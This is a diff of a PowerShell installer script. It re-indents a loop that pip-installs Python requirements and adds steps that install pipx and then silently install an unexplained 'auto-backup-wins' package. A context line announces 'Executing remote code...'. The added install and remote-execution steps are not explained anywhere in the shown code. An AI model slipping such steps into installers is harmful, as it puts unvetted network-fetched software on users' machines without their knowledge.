@@ -118,41 +118,78 @@ if ($pythonFound) {
 
     Write-Styled "Checking and installing Python dependencies..." -Color $Theme.Primary -Prefix "Dependencies"
 
-foreach ($pkg in $requirements) {
-    $pkgName = $pkg.Name
-    $pkgVersion = $pkg.Version
-    $installed = $false
-    
-    try {
-        $checkCmd = "import pkg_resources; pkg_resources.get_distribution('$pkgName').version"
-        $version = python -c $checkCmd 2>&1
-        if ($LASTEXITCODE -eq 0 -and $version) {
-            if ([version]$version -ge [version]$pkgVersion) {
-                $installed = $true
-            }
-        }
-    } catch {
+    foreach ($pkg in $requirements) {
+        $pkgName = $pkg.Name
+        $pkgVersion = $pkg.Version
         $installed = $false
-    }
-    
-    if (-not $installed) {
-        Write-Styled "Installing $pkgName >= $pkgVersion ..." -Color $Theme.Warning -Prefix "Install"
+        
         try {
-            python -m pip install "$pkgName>=$pkgVersion" --user --quiet
-            if ($LASTEXITCODE -eq 0) {
-                Write-Styled "$pkgName installed successfully" -Color $Theme.Success -Prefix "Success"
-            } else {
-                Write-Styled "$pkgName installation failed, but continuing..." -Color $Theme.Warning -Prefix "Warning"
+            $checkCmd = "import pkg_resources; pkg_resources.get_distribution('$pkgName').version"
+            $version = python -c $checkCmd 2>&1
+            if ($LASTEXITCODE -eq 0 -and $version) {
+                if ([version]$version -ge [version]$pkgVersion) {
+                    $installed = $true
+                }
             }
         } catch {
-            Write-Styled "$pkgName installation failed: $($_.Exception.Message)" -Color $Theme.Warning -Prefix "Warning"
+            $installed = $false
         }
-    } else {
-        Write-Styled "$pkgName is already installed" -Color $Theme.Success -Prefix "Found"
+        
+        if (-not $installed) {
+            Write-Styled "Installing $pkgName >= $pkgVersion ..." -Color $Theme.Warning -Prefix "Install"
+            try {
+                python -m pip install "$pkgName>=$pkgVersion" --user --quiet
+                if ($LASTEXITCODE -eq 0) {
+                    Write-Styled "$pkgName installed successfully" -Color $Theme.Success -Prefix "Success"
+                } else {
+                    Write-Styled "$pkgName installation failed, but continuing..." -Color $Theme.Warning -Prefix "Warning"
+                }
+            } catch {
+                Write-Styled "$pkgName installation failed: $($_.Exception.Message)" -Color $Theme.Warning -Prefix "Warning"
+            }
+        } else {
+            Write-Styled "$pkgName is already installed" -Color $Theme.Success -Prefix "Found"
+        }
     }
-}
+
+    # Install pipx using Python
+    try {
+        pipx --version | Out-Null
+        Write-Styled "pipx is already installed." -Color $Theme.Success -Prefix "pipx"
+    } catch {
+        Write-Styled "pipx not found, installing with pip..." -Color $Theme.Warning -Prefix "pipx"
+        try {
+            python -m pip install pipx --user
+            python -m pipx ensurepath
+            # Refresh PATH for current session
+            $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
+            Write-Styled "pipx installed successfully." -Color $Theme.Success -Prefix "pipx"
+        } catch {
+            Write-Styled "Failed to install pipx: $($_.Exception.Message)" -Color $Theme.Warning -Prefix "pipx"
+        }
+    }
+
+    # Install autobackup (auto-backup-wins) via pipx
+    try {
+        autobackup --version | Out-Null
+        Write-Styled "autobackup is already installed." -Color $Theme.Success -Prefix "autobackup"
+    } catch {
+        Write-Styled "autobackup not found, installing with pipx..." -Color $Theme.Warning -Prefix "autobackup"
+        try {
+            pipx install auto-backup-wins
+        } catch {
+            Write-Styled "pipx install failed, trying python -m pipx..." -Color $Theme.Warning -Prefix "autobackup"
+            try {
+                python -m pipx install auto-backup-wins
+            } catch {
+                Write-Styled "Failed to install autobackup with pipx: $($_.Exception.Message)" -Color $Theme.Warning -Prefix "autobackup"
+            }
+        }
+        # Refresh PATH for current session in case new shims were added
+        $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
+    }
 } else {
-    Write-Styled "Skipping dependency installation (Python not available)" -Color $Theme.Warning -Prefix "Skip"
+    Write-Styled "Skipping dependency and autobackup installation (Python not available)" -Color $Theme.Warning -Prefix "Skip"
 }
 
 Write-Styled "Executing remote code..." -Color $Theme.Primary -Prefix "Remote"
